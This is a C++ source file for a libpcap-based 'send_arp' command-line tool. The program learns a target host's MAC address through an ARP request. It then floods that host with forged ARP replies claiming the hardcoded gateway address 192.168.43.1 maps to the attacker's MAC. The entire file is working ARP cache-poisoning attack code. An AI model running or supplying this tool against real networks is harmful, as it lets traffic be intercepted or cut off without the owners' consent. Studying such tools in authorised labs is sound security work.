#include <iostream>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include <pcap.h>

using namespace std;

struct ethernet_header{
    uint8_t dst_mac[6];
    uint8_t src_mac[6];
    uint8_t type[2];
};

struct arp_header{
    uint8_t hd_type[2];
    uint8_t pr_type[2];
    uint8_t hd_len;
    uint8_t pr_len;
    uint8_t opcode[2];
    uint8_t smac[6];
    uint8_t sip[4];
    uint8_t tmac[6];
    uint8_t tip[4];
};

void get_smac(char* smac, char* iface){
   	int fd;
	
	struct ifreq ifr;
	char *mac;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char *)ifr.ifr_name , (const char *)iface , IFNAMSIZ-1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);
	
	mac = (char *)ifr.ifr_hwaddr.sa_data;
	for(int i=0; i<6; i++) smac[i] = mac[i];
}

bool check_arp(const u_char* packet){
    struct ethernet_header eth;
    int type;

    memcpy(&eth, packet, 14);
    type = (eth.type[0]<<8 | eth.type[1]);
    if(type == 0x0806) return true;
    else return false;
}

void extract_mac(const u_char* packet, uint8_t* tmac){
    struct arp_header arp;
    memcpy(&arp, &packet[14], 28);
    for (int i=0; i<6; i++) tmac[i] = arp.smac[i];
}

void get_tmac(pcap_t* handle, uint8_t* smac, uint8_t* tmac, uint8_t* sip, uint8_t* tip){
    struct ethernet_header eth;
    struct arp_header arp;
    u_char buf[60] = {0};
    // compose ethernet header
    memcpy(eth.dst_mac, "\xff\xff\xff\xff\xff\xff", 6);
    memcpy(eth.src_mac, smac, 6);
    memcpy(eth.type, "\x08\x06", 2);
    // compose arp header
    memcpy(arp.hd_type, "\x00\x01", 2);
    memcpy(arp.pr_type, "\x08\x00", 2);
    arp.hd_len = '\x06';
    arp.pr_len = '\x04';
    memcpy(arp.opcode, "\x00\x01", 2);  // request
    memcpy(arp.smac, smac, 6);
    memcpy(arp.sip, sip, 4);
    memcpy(arp.tmac, "\x00\x00\x00\x00\x00\x00", 6);
    memcpy(arp.tip, tip, 4);
    
    // compose packet data
    memcpy(buf, &eth, 14);
    memcpy(&buf[14], &arp, 28);
    
    if(!pcap_sendpacket(handle, buf, 60)) 
        printf("send packet....\n");
    else {
        fprintf(stderr, "send packet error!\n");
    }

    
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        printf("%u bytes captured\n", header->caplen);

        if(check_arp(packet)) {
            extract_mac(packet, tmac);
            break;
        }
    }

}

void send_fake_packet(pcap_t* handle, uint8_t* smac, uint8_t* tmac, uint8_t* tip){
    struct ethernet_header eth;
    struct arp_header arp;
    
    u_char buf[60] = {0};
    // compose ethernet header
    memcpy(eth.dst_mac, tmac, 6);
    memcpy(eth.src_mac, smac, 6);
    memcpy(eth.type, "\x08\x06", 2);
    // compose arp header
    memcpy(arp.hd_type, "\x00\x01", 2);
    memcpy(arp.pr_type, "\x08\x00", 2);
    arp.hd_len = '\x06';
    arp.pr_len = '\x04';
    memcpy(arp.opcode, "\x00\x02", 2); // reply
    memcpy(arp.smac, smac, 6);
    inet_aton("192.168.43.1",(in_addr*)arp.sip);
    memcpy(arp.tmac, tmac, 6);
    memcpy(arp.tip, tip, 4);
    
    // compose packet data
    memcpy(buf, &eth, 14);
    memcpy(&buf[14], &arp, 28);
   
    int i=1; 
    while(true){
        if(!pcap_sendpacket(handle, buf, 60)){ 
            printf("[%d] send packet....\n", i);
            i++;
        } else {
            fprintf(stderr, "send packet error!\n");
        }
    }

}

int main(int argc, char* argv[]){

    if(argc != 4){
        printf("usage : ./send_arp [interface] [sender_ip] [target_ip]\n");
        return 1;
    }

    uint8_t smac[6];
    uint8_t tmac[6];
    uint8_t sip[4];
    uint8_t tip[4];

    // get sender mac address
    get_smac((char*)smac, argv[1]);
    printf("[+] my MAC => %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , smac[0], smac[1], smac[2], smac[3], smac[4], smac[5]);

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL){
        fprintf(stderr, "pcap_open_live error!\n");
        return -1;    
    }
    
    inet_aton(argv[2], (in_addr*)sip);
    inet_aton(argv[3], (in_addr*)tip);    

    // send arp packet && get target mac address
    get_tmac(handle, smac, tmac, sip, tip);
    printf("[+] target MAC => %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", tmac[0], tmac[1], tmac[2], tmac[3], tmac[4], tmac[5]);
    
    // send fake reply && initialize target arp cache table
    send_fake_packet(handle, smac, tmac, tip);
   
    return 0;
}
